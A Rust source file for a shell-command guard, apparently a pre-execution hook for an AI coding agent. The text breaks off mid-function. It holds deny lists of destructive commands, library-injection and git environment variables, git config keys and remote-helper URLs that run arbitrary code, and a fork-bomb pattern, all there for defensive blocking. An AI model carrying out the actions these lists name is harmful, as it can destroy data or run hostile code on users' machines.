#![allow(clippy::too_many_lines)]

use serde_json::{Value, json};
use std::io::{self, Read};
use std::path::{Path, PathBuf};

const IS_WINDOWS: bool = cfg!(windows);

const DANGEROUS_COMMANDS: &[&str] = &[
    "mkfs",
    "fdisk",
    "diskpart",
    "format",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init",
    "telinit",
    "wipe",
    "shred",
    "cryptsetup",
    "lvremove",
    "vgremove",
    "pvremove",
    "mkswap",
    "swapoff",
    "usermod",
    "groupmod",
];

const UNANALYZABLE_COMMANDS: &[&str] = &[
    "python",
    "python2",
    "python3",
    "pythonw",
    "py",
    "pyw",
    "perl",
    "ruby",
    "node",
    "nodejs",
    "deno",
    "bun",
    "php",
    "lua",
    "micropython",
    "pypy",
    "pypy3",
    "ssh",
    "scp",
    "sftp",
    "chroot",
    "systemd-run",
    "systemd-nspawn",
    "script",
    "screen",
    "tmux",
    "expect",
    "powershell",
    "pwsh",
    "powershell.exe",
    "pwsh.exe",
    "eval",
    "exec",
    "awk",
    "gawk",
    "nawk",
    "mawk",
    "tclsh",
    "wish",
    "osascript",
    "npx",
    "busybox",
    "docker",
    "podman",
    "nerdctl",
    "buildah",
    "crictl",
    "unshare",
    "nsenter",
    "pkexec",
    "run0",
    "runas",
    "su",
    "runuser",
    "sg",
    "ionice",
    "taskset",
    "flock",
    "chrt",
    "numactl",
    "chronic",
    "crontab",
    "at",
    "batch",
    "reg",
    "reg.exe",
    "schtasks",
    "sc",
    "icacls",
    "takeown",
    "wscript",
    "cscript",
    "mshta",
];

const WINDOWS_CMD_LAUNCHERS: &[&str] = &["start", "call", "runas"];

const SHELL_METACHARS: &[char] = &[';', '&', '|', '>', '<', '(', ')', '{', '}', '!', '\n', '\r'];

const UNSAFE_ENV_KEYS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "LD_PROFILE",
    "LD_PRELOAD_32",
    "LD_PRELOAD_64",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "DYLD_FRAMEWORK_PATH",
    "PYTHONPATH",
    "NODE_OPTIONS",
    "GITSIDELOAD",
    "ENV",
    "BASH_ENV",
    "PROMPT_COMMAND",
    "GIT_SSH_COMMAND",
    "GIT_SSH",
    "GIT_EDITOR",
    "GIT_SEQUENCE_EDITOR",
    "GIT_PAGER",
    "GIT_CONFIG_COUNT",
    "GIT_CONFIG_GLOBAL",
    "GIT_CONFIG_SYSTEM",
    "GIT_ATTR_GLOBAL",
    "GIT_ATTR_SYSTEM",
    "EMAIL",
];

const HOOK_DIR_MARKERS: &[&str] = &[".grok/hooks", ".omgb/hooks"];

const GIT_ALLOWED_SUBCOMMANDS: &[&str] = &[
    "add",
    "branch",
    "checkout",
    "clone",
    "commit",
    "config",
    "diff",
    "fetch",
    "init",
    "log",
    "merge",
    "mv",
    "pull",
    "push",
    "rebase",
    "remote",
    "reset",
    "restore",
    "rev-parse",
    "rm",
    "show",
    "stash",
    "status",
    "switch",
    "tag",
    "worktree",
];

const GIT_GLOBAL_OPTS_WITH_VALUES: &[&str] = &[
    "-C",
    "--work-tree",
    "--git-dir",
    "--namespace",
    "--super-prefix",
    "--exec-path",
];

/// Git config keys that, when set, can cause git to execute arbitrary commands
/// or run arbitrary hooks the next time a git command is invoked.
const GIT_CONFIG_EXEC_KEYS: &[&str] = &[
    "core.pager",
    "core.editor",
    "core.hooksPath",
    "core.fsmonitor",
    "core.preloadIndex",
    "core.excludesFile",
    "core.worktree",
    "core.sshCommand",
    "core.ssh",
    "gpg.program",
    "init.templateDir",
    "diff.external",
    "merge.tool",
];

fn is_dangerous_git_config_key(key: &str) -> bool {
    let lower = key.to_lowercase();
    if lower.starts_with("alias.") {
        return true;
    }
    if GIT_CONFIG_EXEC_KEYS
        .iter()
        .any(|k| lower.eq_ignore_ascii_case(k))
    {
        return true;
    }
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() >= 3
        && parts[0] == "filter"
        && ["clean", "smudge", "process"].contains(&parts[parts.len() - 1])
    {
        return true;
    }
    parts[0] == "include" || parts[0].starts_with("includeif")
}

const NORMALIZABLE_STEMS: &[&str] = &[
    "python",
    "python2",
    "python3",
    "pythonw",
    "py",
    "pyw",
    "perl",
    "ruby",
    "node",
    "nodejs",
    "deno",
    "bun",
    "php",
    "lua",
    "micropython",
    "pypy",
    "pypy3",
    "bash",
    "sh",
    "dash",
    "zsh",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "awk",
    "gawk",
    "nawk",
    "mawk",
    "tclsh",
    "wish",
    "osascript",
    "busybox",
    "docker",
    "podman",
    "nerdctl",
    "buildah",
    "crictl",
    "unshare",
    "nsenter",
    "pkexec",
    "run0",
];

const WIN_EXEC_EXTS: &[&str] = &[
    ".exe", ".com", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".wsf", ".msc", ".cpl", ".scr", ".pif",
];

/// Script extensions that, when executed directly, run arbitrary code through
/// an interpreter. We block them unless the stripped base name is already a
/// known unanalyzable or dangerous command.
const SCRIPT_EXTS: &[&str] = &[
    ".bat", ".cmd", ".ps1", ".vbs", ".js", ".wsf", ".py", ".pyw", ".pl", ".rb", ".sh", ".hta",
    ".scr", ".pif", ".cpl", ".msc",
];

fn win_exec_ext(s: &str) -> Option<&str> {
    WIN_EXEC_EXTS
        .iter()
        .find(|&&ext| s.len() >= ext.len() && s[s.len() - ext.len()..].eq_ignore_ascii_case(ext))
        .copied()
}

fn script_ext(s: &str) -> Option<&str> {
    SCRIPT_EXTS
        .iter()
        .find(|&&ext| s.len() >= ext.len() && s[s.len() - ext.len()..].eq_ignore_ascii_case(ext))
        .copied()
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum QuoteKind {
    Single,
    Double,
}

#[derive(Debug, Clone)]
struct Token {
    value: String,
    quoted: Option<QuoteKind>,
}

#[derive(Debug, Clone, PartialEq)]
enum Decision {
    Allow,
    Deny(String),
}

#[derive(Debug, Clone, PartialEq)]
enum PrefixOutcome {
    Stop(Decision),
    Continue(usize),
}

fn main() {
    let mut input = String::new();
    let decision = match io::stdin().read_to_string(&mut input) {
        Ok(_) => match parse_command(&input) {
            Ok(cmd) => evaluate(&cmd),
            Err(reason) => Decision::Deny(reason),
        },
        Err(_) => Decision::Deny("Invalid guard payload".into()),
    };
    match decision {
        Decision::Allow => {
            println!("{}", json!({ "decision": "allow" }));
            std::process::exit(0);
        }
        Decision::Deny(reason) => {
            println!("{}", json!({ "decision": "deny", "reason": reason }));
            std::process::exit(2);
        }
    }
}

fn parse_command(input: &str) -> Result<String, String> {
    let payload: Value =
        serde_json::from_str(input).map_err(|_| "Invalid guard payload".to_string())?;
    match payload.get("toolInput").and_then(|t| t.get("command")) {
        Some(v) if v.is_string() => Ok(v.as_str().unwrap_or("").to_string()),
        Some(_) => Err("Command must be a string".to_string()),
        None => Ok(String::new()),
    }
}

fn evaluate(command: &str) -> Decision {
    match tokenize(command) {
        Ok(tokens) => evaluate_tokens(&tokens, 0),
        Err(reason) => Decision::Deny(reason),
    }
}

fn tokenize(command: &str) -> Result<Vec<Token>, String> {
    let chars: Vec<char> = command.chars().collect();
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote = None::<char>;
    let mut escape = false;

    for i in 0..chars.len() {
        let ch = chars[i];
        if escape {
            current.push(ch);
            escape = false;
            continue;
        }
        if IS_WINDOWS && quote.is_none() && ch == '^' {
            return Err("Blocked Windows escape character".into());
        }
        if ch == '\\' && quote != Some('\'') {
            if IS_WINDOWS {
                current.push('\\');
                continue;
            }
            if quote == Some('"') {
                let next = chars.get(i + 1);
                if next == Some(&'$')
                    || next == Some(&'`')
                    || next == Some(&'"')
                    || next == Some(&'\\')
                    || next == Some(&'\n')
                {
                    escape = true;
                    continue;
                }
                current.push('\\');
                continue;
            }
            escape = true;
            continue;
        }
        if let Some(q) = quote {
            if ch == q {
                let kind = if q == '\'' {
                    QuoteKind::Single
                } else {
                    QuoteKind::Double
                };
                quote = None;
                tokens.push(Token {
                    value: current,
                    quoted: Some(kind),
                });
                current = String::new();
            } else if q == '"' && (ch == '$' || ch == '`' || (IS_WINDOWS && ch == '%')) {
                let reason = if ch == '`' {
                    "Blocked command substitution (backtick) inside double quotes"
                } else if ch == '%' {
                    "Blocked Windows variable expansion inside double quotes"
                } else if chars.get(i + 1) == Some(&'(') {
                    "Blocked command substitution inside double quotes"
                } else if chars.get(i + 1) == Some(&'{') {
                    "Blocked parameter expansion inside double quotes"
                } else {
                    "Blocked variable expansion inside double quotes"
                };
                return Err(reason.into());
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch == '"' || ch == '\'' {
            if !current.is_empty() {
                tokens.push(Token {
                    value: current,
                    quoted: None,
                });
                current = String::new();
            }
            quote = Some(ch);
            continue;
        }
        if SHELL_METACHARS.contains(&ch) {
            return Err(format!("Blocked shell metacharacter '{}'", ch));
        }
        if ch.is_whitespace() {
            if !current.is_empty() {
                tokens.push(Token {
                    value: current,
                    quoted: None,
                });
                current = String::new();
            }
            continue;
        }
        if ch == '$' || ch == '`' || (IS_WINDOWS && ch == '%') {
            if ch == '`' {
                return Err("Blocked command substitution (backtick)".into());
            }
            if IS_WINDOWS && ch == '%' {
                return Err("Blocked Windows variable expansion".into());
            }
            if chars.get(i + 1) == Some(&'(') {
                return Err("Blocked command substitution".into());
            }
            if chars.get(i + 1) == Some(&'{') {
                return Err("Blocked parameter expansion".into());
            }
            return Err("Blocked variable expansion".into());
        }
        current.push(ch);
    }

    if quote.is_some() {
        return Err("Unterminated quoted string".into());
    }
    if escape {
        return Err("Trailing backslash escape".into());
    }
    if !current.is_empty() {
        tokens.push(Token {
            value: current,
            quoted: None,
        });
    }
    Ok(tokens)
}

fn strip_win_exec_ext(s: &str) -> &str {
    if let Some(ext) = win_exec_ext(s) {
        &s[..s.len() - ext.len()]
    } else {
        s
    }
}

fn version_suffix_start(s: &str) -> Option<usize> {
    if s.is_empty() {
        return None;
    }
    let mut pos = s.len();
    for (i, c) in s.char_indices().rev() {
        if c.is_ascii_digit() || c == '.' {
            pos = i;
        } else {
            break;
        }
    }
    if pos == s.len() {
        return None;
    }
    let suffix = &s[pos..];
    if !suffix.chars().next().unwrap().is_ascii_digit() || suffix.contains("..") {
        return None;
    }
    let parts: Vec<&str> = suffix.split('.').collect();
    if parts.iter().any(|p| p.is_empty())
        || !parts.iter().all(|p| p.chars().all(|c| c.is_ascii_digit()))
    {
        return None;
    }
    if pos == 0 {
        return None;
    }
    Some(pos)
}

fn normalize_base_name(base: &str) -> String {
    let mut base = base.to_string();
    loop {
        let prev = base.clone();
        if let Some(start) = version_suffix_start(&base) {
            let stem = &base[..start];
            if NORMALIZABLE_STEMS.contains(&stem) {
                base = stem.to_string();
                continue;
            }
        }
        if base == prev {
            break;
        }
    }
    base
}

fn get_base_name(cmd: &str) -> String {
    let s = cmd.trim();
    let s = strip_win_exec_ext(s);
    let last = s.rsplit(['/', '\\']).next().unwrap_or(s);
    normalize_base_name(&last.to_lowercase())
}

fn is_assignment(token: &Token) -> bool {
    if token.quoted.is_some() {
        return false;
    }
    assignment_key(&token.value).is_some()
}

fn assignment_key(s: &str) -> Option<&str> {
    let mut chars = s.char_indices();
    let (_, first) = chars.next()?;
    if !first.is_ascii_alphabetic() && first != '_' {
        return None;
    }
    for (idx, c) in chars {
        if c == '=' {
            return Some(&s[..idx]);
        }
        if !c.is_ascii_alphanumeric() && c != '_' {
            return None;
        }
    }
    None
}

fn is_unsafe_env_key(key: &str) -> bool {
    let upper = key.to_uppercase();
    UNSAFE_ENV_KEYS.contains(&upper.as_str())
        || upper.starts_with("LD_")
        || upper.starts_with("DYLD_")
        || upper.starts_with("GIT_CONFIG_KEY_")
        || upper.starts_with("GIT_CONFIG_VALUE_")
}

fn has_unsafe_env_assignment(token: &Token) -> Option<String> {
    if token.quoted.is_some() {
        return None;
    }
    assignment_key(&token.value).and_then(|k| {
        if is_unsafe_env_key(k) {
            Some(k.to_string())
        } else {
            None
        }
    })
}

fn home_dir() -> Option<PathBuf> {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .ok()
        .map(PathBuf::from)
}

fn omg_dir() -> Option<PathBuf> {
    home_dir().map(|h| h.join(".omgb"))
}

fn normalize_folder_path(s: &str) -> Option<String> {
    let p = s.replace('\\', "/").trim_end_matches('/').to_string();
    if p.is_empty() {
        return None;
    }
    if !(p.starts_with('/') || (IS_WINDOWS && p.len() > 2 && p.as_bytes().get(1) == Some(&b':'))) {
        return None;
    }
    let path = PathBuf::from(&p);
    let resolved = dunce::canonicalize(&path).unwrap_or(path);
    let mut s = resolved.to_string_lossy().replace('\\', "/");
    if !s.ends_with('/') {
        s.push('/');
    }
    Some(s.to_lowercase())
}

fn normalize_folders<'a>(iter: impl Iterator<Item = &'a str>) -> Vec<String> {
    iter.filter_map(normalize_folder_path).collect()
}

fn trusted_folders() -> Vec<String> {
    if let Ok(raw) = std::env::var("OMGB_TRUSTED_FOLDERS") {
        return normalize_folders(raw.split(';'));
    }
    let path = omg_dir().map(|d| d.join("trusted_folders.json"));
    let Some(path) = path else {
        return Vec::new();
    };
    let Ok(raw) = std::fs::read_to_string(&path) else {
        return Vec::new();
    };
    let Ok(Value::Array(arr)) = serde_json::from_str::<Value>(&raw) else {
        return Vec::new();
    };
    normalize_folders(arr.iter().filter_map(|v| v.as_str()))
}

fn current_dir() -> String {
    std::env::current_dir()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default()
}

fn is_absolute_path(p: &str) -> bool {
    if p.starts_with('/') {
        return true;
    }
    IS_WINDOWS && p.len() > 2 && p.as_bytes().get(1) == Some(&b':')
}

/// Return true if any prefix of `path` (including the final component) is a
/// symbolic link, excluding the leading components that match `base`.
fn has_symlink_in_tail(base: &Path, path: &Path) -> bool {
    let base = dunce::simplified(base).to_path_buf();
    let path = dunce::simplified(path).to_path_buf();

    let base_comps: Vec<_> = base.components().collect();
    let path_comps: Vec<_> = path.components().collect();

    let mut common = 0;
    while common < base_comps.len()
        && common < path_comps.len()
        && base_comps[common] == path_comps[common]
    {
        common += 1;
    }
    // If the path diverges from the base before reaching its end, the
    // requested file is outside the base; check every component.
    let skip = if common < base_comps.len() { 0 } else { common };

    let mut prefix = PathBuf::new();
    for (i, comp) in path_comps.iter().enumerate() {
        prefix.push(comp.as_os_str());
        if i < skip {
            continue;
        }
        if let Ok(meta) = std::fs::symlink_metadata(&prefix) {
            if meta.is_symlink() {
                return true;
            }
        }
    }
    false
}

fn is_path_trusted(cwd: &str, p: &str, trusted: &[String]) -> bool {
    let canonical_cwd = match dunce::canonicalize(cwd) {
        Ok(p) => p,
        Err(_) => dunce::simplified(&PathBuf::from(cwd)).to_path_buf(),
    };
    let joined: PathBuf = if is_absolute_path(p) {
        PathBuf::from(p)
    } else {
        canonical_cwd.join(p)
    };

    // Resolve symlinks when the path already exists; otherwise fall back to
    // the simplified path and rely on the per-component symlink check below.
    let real = match dunce::canonicalize(&joined) {
        Ok(p) => p,
        Err(_) => dunce::simplified(&joined).to_path_buf(),
    };

    let mut real_norm = real.to_string_lossy().replace('\\', "/").to_lowercase();
    if !real_norm.ends_with('/') {
        real_norm.push('/');
    }
    if !trusted.iter().any(|t| real_norm.starts_with(t)) {
        return false;
    }

    if has_symlink_in_tail(&canonical_cwd, &joined) {
        return false;
    }
    true
}

fn is_project_hook_command(cmd: &str) -> bool {
    let norm = cmd.replace('\\', "/");
    HOOK_DIR_MARKERS.iter().any(|m| norm.contains(m))
}

fn is_shell_source_ext(path: &str) -> bool {
    const ALLOWED: &[&str] = &[
        "",
        "sh",
        "bash",
        "zsh",
        "ksh",
        "csh",
        "tcsh",
        "fish",
        "env",
        "profile",
        "bashrc",
        "zshrc",
        "bash_profile",
        "bash_login",
        "bash_logout",
        "zlogout",
        "zprofile",
    ];
    let lower = path.to_lowercase();
    if let Some(idx) = lower.rfind('.') {
        let ext = &lower[idx + 1..];
        return ALLOWED.contains(&ext);
    }
    true
}

fn check_source(tokens: &[Token], i: usize) -> Decision {
    let Some(token) = tokens.get(i + 1) else {
        return Decision::Deny("Blocked sourced script (no path)".into());
    };
    if !is_shell_source_ext(&token.value) {
        return Decision::Deny("Blocked sourced script (non-shell extension)".into());
    }
    if is_path_trusted(&current_dir(), &token.value, &trusted_folders()) {
        Decision::Allow
    } else {
        Decision::Deny("Blocked sourced script (not under a trusted folder)".into())
    }
}

fn check_project_hook(cmd: &str) -> Decision {
    if is_path_trusted(&current_dir(), cmd, &trusted_folders()) {
        Decision::Allow
    } else {
        Decision::Deny("Blocked project hook (not under a trusted folder)".into())
    }
}

fn is_git_alias_value(v: &str) -> bool {
    v.starts_with('!') || (v.contains('!') && v.contains("alias."))
}

fn is_dangerous_git_url(v: &str) -> bool {
    let lower = v.to_lowercase();
    if lower.starts_with("ext::") || lower.starts_with("remote-ext::") {
        return true;
    }
    // Absolute/relative local paths cannot be remote-helper URLs.
    if lower.starts_with('/')
        || lower.starts_with("./")
        || lower.starts_with("../")
        || (IS_WINDOWS && lower.len() >= 2 && lower.as_bytes().get(1) == Some(&b':'))
    {
        return false;
    }
    // Remote-helper URLs look like "transport::anything" and are not "scheme://".
    lower.contains("::") && !lower.contains("://")
}

fn git_option_deny_reason(sub: &str, u: &str) -> Option<&'static str> {
    if u.starts_with("--config") || u == "-c" {
        Some("git -c/--config can run arbitrary commands")
    } else if sub == "rebase" && (u == "-x" || u == "--exec" || u.starts_with("--exec=")) {
        Some("git rebase --exec runs arbitrary commands")
    } else if sub == "rebase" && (u == "-i" || u == "--interactive") {
        Some("git rebase -i requires an interactive terminal")
    } else if (sub == "clone" || sub == "init")
        && (u == "--template" || u.starts_with("--template="))
    {
        Some("git --template can run arbitrary hooks")
    } else if (sub == "clone" || sub == "fetch" || sub == "pull")
        && (u == "--upload-pack" || u.starts_with("--upload-pack="))
    {
        Some("git --upload-pack can run arbitrary commands")
    } else if (sub == "clone" || sub == "push" || sub == "fetch")
        && (u == "--receive-pack" || u.starts_with("--receive-pack="))
    {
        Some("git --receive-pack can run arbitrary commands")
    } else {
        None
    }
}

fn check_git(tokens: &[Token], start: usize) -> Decision {
    let mut i = start + 1;
    let mut skip_value = false;

    // Scan global options/flags until we reach the subcommand.
    while i < tokens.len() {
        if skip_value {
            i += 1;
            skip_value = false;
            continue;
        }
        let token = &tokens[i];
        let v = &token.value;

        if v.starts_with("--config") || v == "-c" {
            return Decision::Deny("git -c/--config can run arbitrary commands".into());
        }
        if is_git_alias_value(v) {
            return Decision::Deny("git aliases with '!' execute arbitrary commands".into());
        }

        // Skip global options that take a value (e.g. -C src).
        if GIT_GLOBAL_OPTS_WITH_VALUES.contains(&v.as_str()) {
            skip_value = true;
            i += 1;
            continue;
        }
        if let Some((name, _)) = v.split_once('=')
            && GIT_GLOBAL_OPTS_WITH_VALUES.contains(&name)
        {
            i += 1;
            continue;
        }

        if v.starts_with('-') {
            i += 1;
            continue;
        }

        // First non-option token is the subcommand; it must be on the allowlist.
        if !GIT_ALLOWED_SUBCOMMANDS.contains(&v.as_str()) {
            return Decision::Deny(format!("Blocked git subcommand: {v}"));
        }

        // Scan the remainder of the command for dangerous options/aliases/URLs.
        let sub = v.as_str();
        i += 1;
        let mut config_non_options: Vec<&str> = Vec::new();
        while i < tokens.len() {
            let u = &tokens[i].value;
            if is_git_alias_value(u) {
                return Decision::Deny("git aliases with '!' execute arbitrary commands".into());
            }
            if let Some(reason) = git_option_deny_reason(sub, u) {
                return Decision::Deny(reason.into());
            }
            if !u.starts_with('-') {
                if sub == "config" {
                    config_non_options.push(u);
                }
                if is_dangerous_git_url(u) {
                    return Decision::Deny("Blocked dangerous git URL".into());
                }
            }
            i += 1;
        }
        if sub == "config"
            && config_non_options.len() >= 2
            && is_dangerous_git_config_key(config_non_options[0])
        {
            return Decision::Deny("git config key can run arbitrary commands".into());
        }
        return Decision::Allow;
    }
    Decision::Allow
}

fn has_bare_tilde(token: &Token) -> bool {
    token.quoted.is_none() && token.value.contains('~')
}

fn is_valid_env_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn check_export_like(tokens: &[Token], i: usize, base: &str) -> Option<Decision> {
    const EXPORT_LIKE: &[&str] = &[
        "export", "setenv", "declare", "typeset", "local", "readonly",
    ];
    if !EXPORT_LIKE.contains(&base) {
        return None;
    }
    let mut saw_first = false;
    for t in tokens.iter().skip(i + 1) {
        let v = &t.value;
        if v.starts_with('-') || v.starts_with('+') {
            continue;
        }
        // setenv takes exactly one variable name; the rest are values.
        if base == "setenv" && saw_first {
            continue;
        }
        saw_first = true;
        if let Some(key) = assignment_key(v) {
            if is_valid_env_identifier(key) && is_unsafe_env_key(key) {
                return Some(Decision::Deny(format!(
                    "Blocked unsafe environment variable: {key}"
                )));
            }
        } else if is_valid_env_identifier(v) && is_unsafe_env_key(v) {
            return Some(Decision::Deny(format!(
                "Blocked unsafe environment variable: {v}"
            )));
        }
    }
    None
}

fn evaluate_tokens(tokens: &[Token], start: usize) -> Decision {
    if start >= tokens.len() {
        return Decision::Deny("Empty command".into());
    }
    let mut i = start;
    while i < tokens.len() && is_assignment(&tokens[i]) {
        if let Some(key) = has_unsafe_env_assignment(&tokens[i]) {
            return Decision::Deny(format!("Blocked unsafe environment assignment: {key}"));
        }
        i += 1;
    }
    if i >= tokens.len() {
        return Decision::Allow;
    }
    // Resolve chained prefixes such as `nice env rm -rf /` or `builtin bash -c ...`.
    loop {
        match skip_prefix(tokens, i) {
            PrefixOutcome::Stop(decision) => return decision,
            PrefixOutcome::Continue(idx) => {
                if idx == i {
                    break;
                }
                if idx >= tokens.len() {
                    return Decision::Allow;
                }
                i = idx;
            }
        }
    }
    if i >= tokens.len() {
        return Decision::Allow;
    }
    let cmd_token = &tokens[i];
    let base = get_base_name(&cmd_token.value);

    if base == "git" {
        return check_git(tokens, i);
    }

    if is_project_hook_command(&cmd_token.value) {
        return check_project_hook(&cmd_token.value);
    }

    if base == "source" || base == "." {
        return check_source(tokens, i);
    }

    if base != "rm" && base != "cd" {
        for token in tokens.iter().skip(i) {
            if has_bare_tilde(token) {
                return Decision::Deny("Blocked tilde expansion outside quotes".into());
            }
        }
    }

    let compact: String = cmd_token.value.split_whitespace().collect();
    if compact.contains(":(){:|:&};") {
        return Decision::Deny("Blocked fork bomb".into());
    }

    if UNANALYZABLE_COMMANDS.contains(&base.as_str()) {
        return Decision::Deny(format!("Blocked unanalyzable command: {}", base));
    }
    if DANGEROUS_COMMANDS.contains(&base.as_str()) {
        return Decision::Deny(format!("Blocked potentially destructive command: {}", base));
    }

    let exec_or_script_ext = win_exec_ext(&cmd_token.value)
        .and_then(|ext| {
            if SCRIPT_EXTS.contains(&ext) {
                Some(ext)
            } else {
                None
            }
        })
        .or_else(|| script_ext(&cmd_token.value));
    if exec_or_script_ext.is_some() {
        return Decision::Deny(format!(
            "Blocked unanalyzable script file: {}",
            cmd_token.value
        ));
    }

    if base == "dd" {
        let argv: Vec<&str> = tokens[i..].iter().map(|t| t.value.as_str()).collect();
        for a in &argv {
            let lower = a.to_lowercase();
            if let Some(path) = lower.strip_prefix("of=") {
                let norm = path.replace('\\', "/");
                if norm.starts_with("/dev/") || norm.starts_with("//./") || norm.starts_with("//?/")
                {
                    return Decision::Deny("Blocked dd writing to a raw device".into());
                }
            }
            if lower.contains("of=/dev/") {
                return Decision::Deny("Blocked dd writing to a raw device".into());
            }
        }
        return Decision::Allow;
    }
    if base == "rm" {
        return check_rm(tokens, i);
    }
    if base == "find" {
        return check_find(tokens, i);
    }
    if base == "del" || base == "erase" {
        let argv: Vec<&str> = tokens[i..].iter().map(|t| t.value.as_str()).collect();
        if argv.iter().any(|a| {
            a.len() >= 2
                && a.starts_with('/')
                && a.chars().nth(1).is_some_and(|c| "fFsSqQaA".contains(c))
        }) {
            return Decision::Deny("Blocked destructive Windows delete".into());
        }
        return Decision::Allow;
    }
    if base == "rd" || base == "rmdir" {
        let argv: Vec<&str> = tokens[i..].iter().map(|t| t.value.as_str()).collect();
        if argv.iter().any(|a| {
            a.len() >= 2
                && a.starts_with('/')
                && a.chars().nth(1).is_some_and(|c| "sSqQ".contains(c))
        }) {
            return Decision::Deny("Blocked destructive Windows rd/rmdir".into());
        }
        return Decision::Allow;
    }
    if base == "systemctl" {
        return check_systemctl(tokens, i);
    }

    if let Some(decision) = check_export_like(tokens, i, &base) {
        return decision;
    }

    Decision::Allow
}

fn skip_prefix(tokens: &[Token], i: usize) -> PrefixOutcome {
    if i >= tokens.len() {
        return PrefixOutcome::Continue(i);
    }
    let base = get_base_name(&tokens[i].value);
    match base.as_str() {
        "nohup" | "setsid" => PrefixOutcome::Continue(i + 1),
        "nice" => parse_nice(tokens, i),
        "time" => parse_time(tokens, i),
        "env" => parse_env(tokens, i),
        "timeout" => parse_timeout(tokens, i),
        "stdbuf" => parse_stdbuf(tokens, i),
        "command" => parse_command_prefix(tokens, i),
        "builtin" => parse_builtin(tokens, i),
        "sudo" | "doas" => parse_sudo_doas(tokens, i, &base),
        "bash" | "sh" | "dash" | "zsh" | "ksh" | "csh" | "tcsh" | "fish" => {
            parse_interpreter(tokens, i, "-c")
        }
        "cmd" => parse_cmd(tokens, i),
        "wsl" => parse_wsl(tokens, i),
        "busybox" => parse_busybox(tokens, i),
        "xargs" => parse_xargs(tokens, i),
        _ => PrefixOutcome::Continue(i),
    }
}

fn parse_nice(tokens: &[Token], i: usize) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "-n" || v == "--adjustment" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("nice option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--adjustment=") {
            j += 1;
            continue;
        }
        if v.starts_with("-n") && v.len() > 2 {
            j += 1;
            continue;
        }
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        if v.starts_with('-') && v != "--" {
            j += 1;
            continue;
        }
        break;
    }
    PrefixOutcome::Continue(j)
}

fn parse_time(tokens: &[Token], i: usize) -> PrefixOutcome {
    let no_arg = [
        "-a",
        "-p",
        "-q",
        "-v",
        "--portability",
        "--quiet",
        "--verbose",
        "--help",
        "--version",
    ];
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "-o" || v == "--output" || v == "-f" || v == "--format" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("time option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--output=") || v.starts_with("--format=") {
            j += 1;
            continue;
        }
        if (v.starts_with("-o") || v.starts_with("-f")) && v.len() > 2 {
            j += 1;
            continue;
        }
        if no_arg.contains(&v.as_str()) {
            j += 1;
            continue;
        }
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        if v.starts_with('-') {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown time option".into()));
        }
        break;
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("time missing command".into()));
    }
    PrefixOutcome::Continue(j)
}

fn parse_command_prefix(tokens: &[Token], i: usize) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "-v" || v == "-V" || v == "--describe" {
            return PrefixOutcome::Stop(Decision::Allow);
        }
        if v == "-p" || v == "--path-search" || v == "--help" || v == "--version" {
            j += 1;
            continue;
        }
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        if v.starts_with('-') {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown command option".into()));
        }
        break;
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("command missing command name".into()));
    }
    PrefixOutcome::Continue(j)
}

fn parse_builtin(tokens: &[Token], i: usize) -> PrefixOutcome {
    let j = i + 1;
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("builtin missing builtin name".into()));
    }
    PrefixOutcome::Continue(j)
}

fn get_env_split_string_arg(tokens: &[Token], j: usize) -> Option<PrefixOutcome> {
    let v = &tokens[j].value;
    let (value, remaining_start): (String, usize) = if v == "-S" || v == "--split-string" {
        if j + 1 >= tokens.len() {
            return Some(PrefixOutcome::Stop(Decision::Deny(
                "env -S/--split-string requires a command string".into(),
            )));
        }
        (tokens[j + 1].value.clone(), j + 2)
    } else if let Some(rest) = v.strip_prefix("--split-string=") {
        if rest.is_empty() {
            if j + 1 >= tokens.len() {
                return Some(PrefixOutcome::Stop(Decision::Deny(
                    "env --split-string requires a command string".into(),
                )));
            }
            (tokens[j + 1].value.clone(), j + 2)
        } else {
            (rest.to_string(), j + 1)
        }
    } else if v.starts_with("-S") && v.len() > 2 {
        (v[2..].to_string(), j + 1)
    } else {
        return None;
    };
    match tokenize(&value) {
        Ok(mut inner) => {
            for t in &tokens[remaining_start..] {
                inner.push(t.clone());
            }
            Some(PrefixOutcome::Stop(evaluate_tokens(&inner, 0)))
        }
        Err(e) => Some(PrefixOutcome::Stop(Decision::Deny(e))),
    }
}

fn parse_env(tokens: &[Token], i: usize) -> PrefixOutcome {
    let no_arg = [
        "-i",
        "-v",
        "--ignore-environment",
        "--debug",
        "--help",
        "--version",
    ];
    let mut j = i + 1;
    while j < tokens.len() {
        let t = &tokens[j];
        if is_assignment(t) {
            if let Some(key) = has_unsafe_env_assignment(t) {
                return PrefixOutcome::Stop(Decision::Deny(format!(
                    "Blocked unsafe env set: {key}"
                )));
            }
            j += 1;
            continue;
        }
        let v = &t.value;
